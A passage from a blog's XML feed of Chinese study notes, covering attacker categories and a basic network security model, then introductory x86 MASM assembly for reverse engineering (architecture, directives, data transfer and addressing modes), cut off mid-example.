title="攻击者分类"></a>攻击者分类</h2><p>黑客：指对计算机软件系统和计算机网络有深入了解，并热衷于探索计算机系统内部机制，积极寻找算法缺陷和系统漏洞的专家。</p><p>黑帽黑客：为了自身利益专门破坏他人计算机系统的人</p><p>白帽黑客：为了寻找安全漏洞和提供更多的安全措施而探索网络安全漏洞的人</p><p>灰帽黑客：介于白帽黑客和黑帽黑客之间</p><p>当挖掘出软件产品的安全漏洞，白帽和灰帽黑客会首先与生产该产品的公司取得联系，寻找问题补救方案。</p><p>脚本小子：脚本小子是一群用黑客写的程序攻击他人计算机的人。脚本小子不知道如何写黑客软件或者并不理解黑客软件工作原理，但是却仍然具有不可忽视的危害性。</p><br/><p>电脑间谍：电脑间谍主要工作是拦截网络通信，获取情报。每个国家都有自己的情报机关，每支军队有自己的情报系统，他们收集情报，破译各类密码通信。美国的国家安全局(NSA)和中央情报局(CIA)就是这样的部门，聘请一流的数学家为其工作，研制各种加密和破解算法。</p><p>恶意员工：恶意员工是那些试图破坏公司网络安全的员工。恶意员工在自己编写的软件内植入后门，使他在被解雇后仍可非法进入该程序，或者在软件内设置逻辑炸弹使其在被解雇后的某一个时刻启动，对公司进行报复。</p><p>电脑恐怖分子：电脑恐怖分子是那些专门从事危害计算机安全从而制造公众恐慌的极端分子。</p><h2 id="网络安全基本模型"><a href="#网络安全基本模型" class="headerlink" title="网络安全基本模型"></a>网络安全基本模型</h2><p>网络安全基本模型由四部分组成：密码系统(Cryptosystem)、防火墙(Firewall)、抗恶意软件(AMS software)、入侵检测系统(IDS)。</p><p>密码系统：密码系统是保护网络传输的数据的机密性和完整性的主要防御机制，以计算机密码学为根基建立起来，包括加密协议、数据认证协议、密钥管理协议。通常用E表示加密算法，D表示解密算法，K表示秘钥，M表示明文，C表示密文。</p><p>防火墙、抗恶意软件和入侵检测系统是保护局域网及联网计算机内数据的机密性和完整性的主要防御机制。</p><p>防火墙：检查来往的数据包，不让具有危害性的数据包通过，可以采用**硬件(FPGA)**来加快处理速度。</p><p>抗恶意软件：扫描系统内所有文件，检查这些软件是否是恶意软件或者含有恶意软件，将其隔离或者删除。</p><p>入侵检测：<strong>监视系统登陆</strong>、<strong>分析网络流量</strong>和<strong>用户行为</strong>，从大量数据中找出入侵者的蛛丝马迹，并及时向系统管理人员发送入侵警报。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 预备知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编语言与逆向技术</title>
      <link href="/2023/02/21/hui-bian-yu-yan-yu-ni-xiang-ji-zhu/"/>
      <url>/2023/02/21/hui-bian-yu-yan-yu-ni-xiang-ji-zhu/</url>
      
        <content type="html"><![CDATA[<h1 id="汇编语言基础知识"><a href="#汇编语言基础知识" class="headerlink" title="汇编语言基础知识"></a>汇编语言基础知识</h1><p><strong>汇编语言的特点</strong></p><ul><li>助记符代替机器语言中的二进制操作码</li><li>地址符号或标号，代替指令或操作数的二进制地址</li></ul><p><strong>C++中也可以使用汇编语言</strong></p><ul><li>使用高级结构和访问底层细节之间提供了一种折中方案</li><li>直接访问硬件，会使C++程序完全丧失可移植性</li></ul><p><strong>汇编语言的应用场景</strong></p><ul><li>嵌入式系统：内存空间小，汇编语言可以节省内存空间</li><li>实时系统：汇编语言可以完全控制机器码，执行速度快</li><li>游戏机：有专用的系统，要求程序在大小和运行速度两方面都要做高度优化</li><li>驱动程序</li><li>加密算法：高级语言的种种限制阻碍位操作、数据加密等底层操作的有效实现，汇编语言会加快数据的加密速度</li><li>底层操作</li></ul><p><strong>逆向分析</strong></p><ul><li>软件调试</li><li>软件漏洞挖掘</li><li>计算机病毒分析</li><li>软件知识产权保护</li></ul><p><strong>虚拟机</strong></p><ul><li>抽象出计算机软硬件之间的相互关系</li><li>对于每个语言层次，将其想象成一台假想的计算机</li><li>高层虚拟机的程序，通过解释或翻译的方式，在底层虚拟机上执行</li></ul><blockquote><p>翻译方式：高层虚拟机的程序被整体翻译成底层虚拟机程序，然后在底层虚拟机上执行</p><p>解释方式：低层虚拟机对高层虚拟机的程序，逐条指令进行解码并执行</p></blockquote><p><strong>虚拟机的层次</strong></p><ul><li>第0层：数字逻辑</li><li>第1层：微结构（芯片上特殊的微结构指令）</li><li>第2层：指令集体系结构（固化在处理器内部的指令集）</li><li>第3层：操作系统（定义交互界面的虚拟机）</li><li>第4层：汇编语言（助记符）</li><li>第5层：高级语言（功能强大）</li></ul><p><strong>字符集</strong></p><p>字符集是一个系统支持的所有抽象字符的集合。</p><ul><li>ASCII字符集</li><li>Unicode（在Windows中用两字节对其进行编码，因此也被称为宽字符集）</li></ul><p><strong>字节序</strong></p><p>endian：表示数据在存储器中的存放顺序。</p><ul><li>大端字节序：一个多字节组成的数据，最高位被存储在内存的低地址上。网络中的通信数据使用大端字节序，也称为网络字节序。</li><li>小端字节序：一个多字节组成的数据，最低位被存储在内存的低地址上。Windows程序中使用小端字节序。</li></ul><h1 id="IA-32处理器体系结构"><a href="#IA-32处理器体系结构" class="headerlink" title="IA-32处理器体系结构"></a>IA-32处理器体系结构</h1><p><strong>指令执行周期</strong></p><ul><li>取指令：指令指针IP</li><li>解码：控制单元CU确定执行什么操作</li><li>取操作数：从内存读操作数</li><li>执行：算术逻辑单元ALU</li><li>存储输出操作数：向内存写入</li></ul><p><strong>IA-32英特尔32位体系结构</strong></p><ul><li>1985年 80386CPU首次使用</li><li>32位内存地址</li><li>32位数据操作数</li></ul><p><strong>工作模式</strong></p><ul><li>实地址模式（Real-Address Mode）<blockquote><p>16位，8086程序设计环境</p><ul><li>20条地址线</li><li>存储空间1MB（2^20）</li></ul></blockquote></li><li>保护模式（Protected Mode）<blockquote><p>32位，IA-32程序设计环境（虚拟8086模式：执行8086程序）</p><ul><li>多任务操作系统</li><li>程序有独立的4GB内存存储空间（2^32）</li></ul></blockquote></li></ul><p><strong>寄存器</strong></p><ul><li>通用寄存器</li><li>段寄存器</li><li>EFLAGS寄存器</li><li>指令指针寄存器（EIP）存放下一条机器指令的内存地址</li></ul><p><strong>IA-32内存管理</strong></p><p>IA-32保护模式的内存管理比实地址模式要复杂</p><ul><li>多任务</li><li>多用户</li><li>段模式、页模式</li><li>页模式也是基于段模式，通常称为段页式</li></ul><p><strong>段管理</strong></p><ul><li>一般保护模式的程序有3个段，段是一块内存空间<ul><li>代码段CS</li><li>数据段DS</li><li>堆栈段SS</li></ul></li><li>GDT全局描述符表<ul><li>整个系统只有一个GDT（64bit）</li><li>Intel提供了一个寄存器GDTR用于存放GDT的入口地址</li></ul></li><li>LDT局部描述符表<ul><li>每个程序都有自己的LDT</li><li>IA-32为LDT的入口地址也提供了一个寄存器LDTR</li><li>因为在任何时刻都只有一个任务在运行，所以LDTR也只需要一个</li></ul></li></ul><p><font color=red>全局/局部描述符表作用是什么？</font></p><p><strong>段寄存器</strong></p><ul><li>index（13bits），段描述符在表中的索引</li><li>TI（1bit）,0是GDT，1是LDT</li><li>RPL（2bits）,Request Privilege Level，权限<ul><li>Ring 0，kernel Mode</li><li>Ring 3，User Mode</li></ul></li></ul><p><strong>分页机制</strong></p><ul><li>段又被分割成内存页（page）</li><li>内存页统一为4096字节的内存块（2^12，4K）</li><li>提高内存的利用率，减少内存碎片</li><li>页交换，不使用的内存页被交换到硬盘上<ul><li>虚拟内存空间大于实际的物理内存空间</li><li>页交换降低程序执行速度</li></ul></li><li>多级页表的分页机制</li></ul><p><img src="/2023/02/21/hui-bian-yu-yan-yu-ni-xiang-ji-zhu/7ad4cc72ff7812fcb3f082c0eddee3bc.png" class="lazyload placeholder" data-srcset="/2023/02/21/hui-bian-yu-yan-yu-ni-xiang-ji-zhu/7ad4cc72ff7812fcb3f082c0eddee3bc.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h1 id="汇编语言基础"><a href="#汇编语言基础" class="headerlink" title="汇编语言基础"></a>汇编语言基础</h1><p>本文介绍的是Intel x86汇编</p><h2 id="汇编语言的基本元素"><a href="#汇编语言的基本元素" class="headerlink" title="汇编语言的基本元素"></a>汇编语言的基本元素</h2><p><strong>整数常量</strong></p><ul><li>[{+|-}]数字[基数]，基数后缀（Radix）</li><li>h十六进制、q/o八进制、d十进制、b二进制、 r编码实数</li><li>如果整数常量后面没有基数后缀，默认是十进制整数</li><li>以字母开头的十六进制常量前面必须加0</li></ul><p><strong>实数常量</strong></p><ul><li>十进制实数<ul><li>-1.11E-5、2.、+3.0、2.E5</li><li>十进制实数常量由符号sign、整数、小数点、小数和指数组成</li><li>[sign]integer.[integer][exponent]</li><li>至少要有一个数字和一个小数点</li></ul></li><li>编码（十六进制）实数<ul><li>编码实数是以十六进制数表示一个实数，遵循IEEE浮点数格式</li></ul></li></ul><p><strong>字符常量</strong></p><ul><li>单引号或者双引号括起来的单个字符</li><li>汇编器会将其转化为ASCII编码</li></ul><p><strong>字符串常量</strong></p><ul><li>以单引号或者双引号括起来的一串字符</li><li>嵌套引号</li></ul><p><strong>保留字</strong></p><ul><li>指令助记符：是一个简短的单词，用于表示一条指令（MOV、ADD）</li><li>伪指令：伪指令内嵌在汇编语言源代码中，由汇编器识别、执行相应动作的命令，用于定义变量、段、过程、汇编器选项等。（INCLUDE、PROC）</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">定义变量</span><br><span class="line">my_var DWORD 100h;  DWORD伪指令</span><br><span class="line">mov eax,my_var; mov指令</span><br><span class="line">定义段（Segment）</span><br><span class="line">.data、.code、.stack</span><br><span class="line">定义过程</span><br><span class="line">PROC、ENDP</span><br><span class="line">允许或禁止汇编器的某些特性</span><br><span class="line">OPTION、.386、.MODEL</span><br></pre></td></tr></table></figure><ul><li>属性：BYTE、WORD</li><li>预定义符号：$、？</li></ul><p><strong>标识符</strong></p><p>标识符是程序员选择用来标识变量、常量、过程、代码的<strong>标号</strong></p><ul><li>包含1~247个字符</li><li>大小写不敏感（MASM默认）</li><li>第一个字符必须是字母、下划线、@、？或$</li><li>第一个字符不能是数字（对比十六进制整数）</li></ul><p><strong>标号</strong></p><p>标号是充当指令或数据位置标记的标识符</p><ul><li>数据标号<ul><li>标识变量的地址，方便变量的引用<ul><li>count DWORD 100</li><li>array DWORD 100, 101, 102, 103</li><li>相对.data数据段在内存起始地址的偏移</li></ul></li><li>OFFSET可以获取数据标号的内存偏移地址</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">  str_hello BYTE “Hello World!”, 0</span><br><span class="line">.code</span><br><span class="line">  mov eax,OFFSET str_hello</span><br></pre></td></tr></table></figure><ul><li>代码标号<ul><li>标识代码的地址，必须以冒号(:)结尾</li><li>通常用作跳转、循环指令的目标地址</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">target:</span><br><span class="line">  mov eax,100h</span><br><span class="line">  ...</span><br><span class="line">  jmp target</span><br></pre></td></tr></table></figure><p><strong>注释</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">单行注释</span><br><span class="line">mov count ebx;save result to count</span><br><span class="line">块注释:COMMENT伪指令和用户定义的符号</span><br><span class="line">COMMENT !</span><br><span class="line">  this is a comment</span><br><span class="line">!</span><br></pre></td></tr></table></figure><p><strong>NOP指令</strong></p><ul><li>NOP指令，空操作</li><li>用于记时循环</li><li>NOP指令占用1个字节的内存<ul><li>用于后继指令的对其</li><li>IA-32处理器从偶数双字地址处加载代码和数据时更加快速</li></ul></li></ul><h2 id="定义数据"><a href="#定义数据" class="headerlink" title="定义数据"></a>定义数据</h2><p><strong>内部数据类型</strong></p><ul><li>MASM内部以<strong>数据位的个数</strong>定义了多种数据类型    <ul><li>BYTE，db，8</li><li>WORD，dw，16</li><li>DWORD，dd，32</li><li>QWORD，dq，64</li></ul></li><li>MASM汇编器默认情况下，大小写不敏感</li></ul><p><strong>数据定义语句</strong></p><ul><li>为变量在内存中保留存储空间</li><li>为变量指定一个名字（数据标号）</li><li>[变量名] 数据定义伪指令 初始值</li></ul><p><strong>初始值</strong></p><ul><li>数据定义语句中要指令初始值</li><li>多个初始值用逗号隔开<code>my_var DWORD 0, 1, 2, 3</code></li><li>可以指定初始值为0</li><li>?标识在程序运行时初始化该变量</li></ul><p><strong>数据声明的位置</strong></p><ul><li>.data段声明初始化的变量</li><li>.data?段声明未初始化的变量</li></ul><p><strong>定义字符串</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">str_hello BYTE “Hello World!”, 0Dh, 0Ah, </span><br><span class="line">          BYTE “I love assembly language”, </span><br><span class="line">          BYTE 0Dh, 0Ah, 0</span><br></pre></td></tr></table></figure><ul><li>0Dh和0Ah是CR/LF（回车、换行）的ASCII编码</li><li>字符串的结尾是0</li></ul><p><strong>DUP伪指令</strong></p><ul><li>为字符串或数组分配内存空间</li><li>BYTE 20 DUP（0）；20个字节的内存空间</li><li>BYTE 4 DUP（“Hello”）：20个字节，连续的4个“Hello”，每个“Hello”5字节</li></ul><h2 id="符号常量"><a href="#符号常量" class="headerlink" title="符号常量"></a>符号常量</h2><p><strong>符号常量</strong></p><ul><li>将标识符与整数表达式或文本联系起来</li><li>符号常量不占用存储空间</li><li>变量占用存储空间</li></ul><p><strong>等号伪指令</strong></p><ul><li>将符号名和整数表达式联系起来</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">COUNT = 500</span><br><span class="line">mov eax, COUNT</span><br></pre></td></tr></table></figure><ul><li>易于阅读维护，减少程序修改时的查找与替换次数</li></ul><p><strong>计算数组和字符串的大小</strong></p><ul><li>MASM用$运算符存储当前语句的地址偏移值</li><li>$可以用来计算数组或字符串的大小</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">计算字符串的大小</span><br><span class="line">str_hello BYTE “Hello World!”, 0Dh, 0Ah, </span><br><span class="line">          BYTE “I love assembly language”, </span><br><span class="line">          BYTE 0Dh, 0Ah, 0</span><br><span class="line">str_size = ($ - str_hello)</span><br><span class="line">计算数组大小</span><br><span class="line">dw_array DWORD 0, 1, 2, 3, 4</span><br><span class="line">array_size = ($ - dw_array)/4</span><br></pre></td></tr></table></figure><p><strong>EQU伪指令</strong></p><p>EQU伪指令将符号名与整数表达式或任意文本联系起来</p><p><code>name EQU expression/symbol/&lt;text&gt;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PI EQU &lt;3.1415926&gt;</span><br><span class="line">press_key EQU &lt;“Press any key to continue…”, 0&gt;</span><br><span class="line">.data</span><br><span class="line">prompt BYTE pressKey ; 变量</span><br></pre></td></tr></table></figure><ul><li>EQU伪指令不能在程序中重定义</li><li>“=”伪指令可以在程序中重定义</li></ul><h1 id="数据传送与寻址"><a href="#数据传送与寻址" class="headerlink" title="数据传送与寻址"></a>数据传送与寻址</h1><h2 id="数据传送指令"><a href="#数据传送指令" class="headerlink" title="数据传送指令"></a>数据传送指令</h2><p><strong>操作数</strong></p><ul><li>类型：寄存器、内存、立即数、I/O端口</li><li>寄存器操作数的简写符号：r8、r16、r32、reg（任意的通用寄存器）、sreg（16位段寄存器）</li><li>立即数操作数的简写符号：imm、imm8、imm16、imm32</li><li>内存操作数的简写符号：m8、m16、m32、mem</li></ul><p><strong>MOV指令</strong></p><ul><li>MOV指令从源操作数向目的操作数复制数据<code>mov destination，source</code></li><li>两个操作数尺寸必须一致</li><li>两个操作数不可同时为内存操作数（内存之间的数据移动需要结合寄存器）</li><li>目的操作数不能是CS、EIP、IP</li><li>立即数不能直接送至段寄存器</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov byte ptr [var], 5</span><br></pre></td></tr></table></figure><p><strong>直接内存操作数</strong></p><p>变量名（数据标号）：数据段内偏移地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">  var1 DWORD 1000h;内存偏移00403000h</span><br><span class="line">.code</span><br><span class="line">  mov EAX,var1;机器指令A100304000</span><br></pre></td></tr></table></figure><p><strong>内存寻址操作</strong></p><ul><li>masm32使用方括号表示内存寻址操作<code> mov eax, [var1]</code></li><li>直接内存操作数可以不使用中括号<code>mov eax, var1</code></li><li>涉及到算术表达式时，使用中括号<code> mov eax，[var1+5]</code></li></ul><p><strong>整数的零扩展</strong></p><ul><li>复制尺寸较小的操作数到尺寸较大的操作数</li><li>MOVZX(move with zero-extend)</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movzx r32,r/m8</span><br><span class="line">movzx r32,r/m16</span><br><span class="line">movzx r16,r/m8</span><br></pre></td></tr></table></figure><p><strong>符号扩展传送指令</strong></p><ul><li>MOVSX（move with sign-extend）符号扩展传送指令，最高位循<br>环填充所有扩展位</li><li>有符号整数的存储空间扩展</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movsx r32,r/m8</span><br><span class="line">movsx r32,r/m16</span><br><span class="line">movsx r16,r/m8</span><br></pre></td></tr></table></figure><p><strong>LAHF指令</strong></p><p>LAHF（load status flags into AH）指令把EFLAGS寄存器的低字节复制到AH寄存器。</p><ul><li>符号标志(SF)</li><li>零标志(ZF)</li><li>辅助进位标志(AF)</li><li>奇偶标志(PF)</li><li>进位标志(CF)</li></ul><p><strong>SAHF指令</strong></p><ul><li>SAHF（store AH into status flags）指令复制AH寄存器的值至EFLAGS寄存器的低字节</li><li>修改CPU的符号标志（SF）、零标志(ZF)、辅助进位标志(AF)、奇偶标志(PF)、进位标志(CF)</li></ul><p><strong>XCHG指令</strong></p><p>XCHG（exchange data）指令交换两个操作数的内容，可配合寄存器的使用交换两个内存的值。</p><ul><li>XCHG reg, reg</li><li>XCHG reg, mem</li><li>XCHG mem, reg</li></ul><p><strong>直接偏移操作数</strong></p><ul><li>在变量名后面加上一个偏移值，可以创建直接偏移（direct-offset）操作数</li><li>访问没有显式标号的内存</li></ul><p><img src="/2023/02/21/hui-bian-yu-yan-yu-ni-xiang-ji-zhu/f46f1347963fc0702a99f01d6f721e54.png" class="lazyload placeholder" data-srcset="/2023/02/21/hui-bian-yu-yan-yu-ni-xiang-ji-zhu/f46f1347963fc0702a99f01d6f721e54.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="加法和减法"><a href="#加法和减法" class="headerlink" title="加法和减法"></a>加法和减法</h2><p><strong>INC指令</strong></p><p>INC（increment）指令从操作数中加1</p><ul><li>inc &lt;reg&gt;</li><li>inc &lt;mem&gt;</li></ul><p><strong>DEC指令</strong></p><p>DEC（decrement）指令从操作数中减1</p><ul><li>dec &lt;reg&gt;</li><li>dec &lt;mem&gt;</li></ul><p><strong>ADD指令</strong></p><p>ADD指令将同尺寸的源操作数和目的操作数相加。相加的结果存储在目的操作数中，影响标志位CF、ZF、SF、OF、AF、PF</p><ul><li>add &lt;reg&gt;,&lt;reg&gt;</li><li>add &lt;reg&gt;,&lt;mem&gt;</li><li>add &lt;mem&gt;,&lt;reg&gt;</li><li>add &lt;reg&gt;,&lt;imm&gt;</li><li>add &lt;mem&gt;,&lt;imm&gt;</li></ul><p><strong>SUB指令</strong></p><p>SUB指令将源操作数从目的操作数中减掉，影响标志位CF、ZF、SF、OF、AF、PF</p><ul><li>sub &lt;reg&gt;,&lt;reg&gt;</li><li>sub &lt;reg&gt;,&lt;mem&gt;</li><li>sub &lt;mem&gt;,&lt;reg&gt;</li><li>sub &lt;reg&gt;,&lt;imm&gt;</li><li>sub &lt;mem&gt;,&lt;imm&gt;</li></ul><p><strong>NEG指令</strong></p><p>NEG（negate）指令通过将数字转换为对应的补码而求得其相反数，影响标志位CF、ZF、SF、OF、AF、PF</p><ul><li>neg &lt;reg&gt;</li><li>neg &lt;mem&gt;</li></ul><h2 id="和数据相关的操作符和伪指令"><a href="#和数据相关的操作符和伪指令" class="headerlink" title="和数据相关的操作符和伪指令"></a>和数据相关的操作符和伪指令</h2><p><strong>OFFSET操作符</strong></p><ul><li>OFFSET操作符返回数据标号的偏移地址</li><li>偏移地址表示标号距离<strong>数据段</strong>开始的距离<ul><li>CS的值一般是0</li><li>CS为零的时候，OFFSET等同内存虚拟地址</li></ul></li></ul><p><strong>ALIGN伪指令</strong></p><ul><li>ALIGN指令将变量的位置按BYTE、WORD、DWORD边界对齐</li><li>ALIGN 边界值可以是1、2、4、8或16（ a power of 2 ）</li><li>数据段由0填充，代码段由NOP空指令填充</li></ul><p><img src="/2023/02/21/hui-bian-yu-yan-yu-ni-xiang-ji-zhu/37434f2c65a6f87dd10ddc880b185b07.png" class="lazyload placeholder" data-srcset="/2023/02/21/hui-bian-yu-yan-yu-ni-xiang-ji-zhu/37434f2c65a6f87dd10ddc880b185b07.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><strong>PTR操作符</strong></p><p>PTR操作符可以重载操作数声明的默认尺寸</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  .data</span><br><span class="line">    var1 DWORD 12345678h</span><br><span class="line">  .code</span><br><span class="line">start:</span><br><span class="line">  movzx eax,BYTE PTR var1</span><br><span class="line">  movzx ebx,BYTE PTR [var1+1]</span><br><span class="line">  invoke ExitProcess,0</span><br></pre></td></tr></table></figure><p><strong>TYPE操作符</strong></p><p>TYPE操作符返回<strong>变量的字节数</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">  var1 BYTE 0</span><br><span class="line">  var2 WORD 0</span><br><span class="line">  var3 DWORD 0</span><br><span class="line">.code</span><br><span class="line">  mov eax,TYPE var2</span><br></pre></td></tr></table></figure><p><strong>LENGTHOF操作符</strong></p><p>LENGTHOF操作符<strong>计算数组中元素的数目</strong>，元素由出现在<strong>同一行</strong>的值定义</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">  var1 DWORD 0,1,2,3</span><br><span class="line">       DWORD 4,5,6,7</span><br><span class="line">.code</span><br><span class="line">  mov eax,LENGTHOF var1;结果是4</span><br><span class="line">  </span><br><span class="line">.data</span><br><span class="line">  var1 DWORD 0,1,2,3,</span><br><span class="line">       DWORD 4,5,6,7</span><br><span class="line">.code</span><br><span class="line">  mov eax,LENGTHOF var1;结果是8</span><br><span class="line">第一行的最后加一个逗号，连接下一行的初始值</span><br></pre></td></tr></table></figure><p><strong>SIZEOF操作符</strong></p><p>SIZEOF操作符的返回值等于LENGTHOF和TYPE返回值的乘积</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">  var1 DWORD 0,1,2,3,</span><br><span class="line">       DWORD 4,5,6,7</span><br><span class="line">.code</span><br><span class="line">  mov eax,SIZEOF var1;结果是4*8</span><br></pre></td></tr></table></figure><p><strong>LABEL伪指令</strong></p><ul><li>LABEL伪指令允许插入一个标号，并赋予其尺寸属性而无须分配任何实际的存储空间。</li><li>为数据段内其后定义的变量提供一个别名</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">  dw_var LABEL DWORD</span><br><span class="line">  var1 WORD 1234h</span><br><span class="line">  var2 WORD 5678h</span><br><span class="line">.code</span><br><span class="line">  mov eax, dw_var;eax等于56781234h</span><br></pre></td></tr></table></figure><h2 id="间接寻址"><a href="#间接寻址" class="headerlink" title="间接寻址"></a>间接寻址</h2><p><strong>间接寻址</strong></p><p>用寄存器作为<strong>指针</strong>并控制该寄存器的值称为间接寻址（indirect addressing）</p><p><strong>间接操作数</strong></p><p>如果一个操作数使用的是间接寻址，就称之为间接操作数（indirect operand）。</p><p>任何一个 32 位通用寄存器（EAX、EBX、ECX、EDX、ESI、EDI、EBP 和 ESP）加上方括号就能构成一个间接操作数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">  val DWORD 12345678h</span><br><span class="line">.code</span><br><span class="line">  mov esi, OFFSET val</span><br><span class="line">  mov eax, DWORD PTR [esi]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">  array_dw DWORD 10000h, 20000h, 30000h</span><br><span class="line">.code</span><br><span class="line">  mov esi, OFFSET array_dw</span><br><span class="line">  mov eax, [esi] ;（第一个数）</span><br><span class="line">  add esi, 4</span><br><span class="line">  add eax, [esi] ;（第二个数）</span><br><span class="line">  add esi, 4</span><br><span class="line">  add eax, [esi] ;（第三个数）</span><br></pre></td></tr></table></figure><p><strong>变址操作数</strong></p><p>变址操作数（indexed operand）把常量和寄存器相加以得到一个有效地址</p><p>任何32位通用寄存器都可以作为变址寄存器<code>constant[reg]、[constant+reg]</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">  array_dw DWORD 10000h, 20000h, 30000h</span><br><span class="line">.code</span><br><span class="line">  mov esi, 0</span><br><span class="line">  mov eax, array_dw[esi] ;（第一个数）</span><br><span class="line">  add esi, 4</span><br><span class="line">  add eax, array_dw[esi] ;（第二个数）</span><br><span class="line">  add esi, 4</span><br><span class="line">  add eax, array_dw[esi] ;（第三个数）</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">  array_dw DWORD 10000h, 20000h, 30000h</span><br><span class="line">.code</span><br><span class="line">  mov esi, OFFSET array_dw</span><br><span class="line">  mov eax, [esi] ;（第一个数）</span><br><span class="line">  add eax, [esi+4] ;（第二个数）</span><br><span class="line">  add eax, [esi+8] ;（第三个数）</span><br><span class="line">  </span><br><span class="line">  ;变址操作数的比例因子</span><br><span class="line">.data</span><br><span class="line">  array_dw DWORD 10000h, 20000h, 30000h</span><br><span class="line">.code</span><br><span class="line">  mov esi, 0 </span><br><span class="line">  mov eax, array_dw[esi*TYPE array_dw] ;</span><br><span class="line">  mov esi, 1 </span><br><span class="line">  add eax, array_dw[esi* TYPE array_dw] </span><br><span class="line">  mov esi, 2 </span><br><span class="line">  add eax, array_dw[esi* TYPE array_dw]</span><br></pre></td></tr></table></figure><p><strong>指针</strong></p><p>如果一个变量包含另一个变量的地址，则该变量称为指针</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 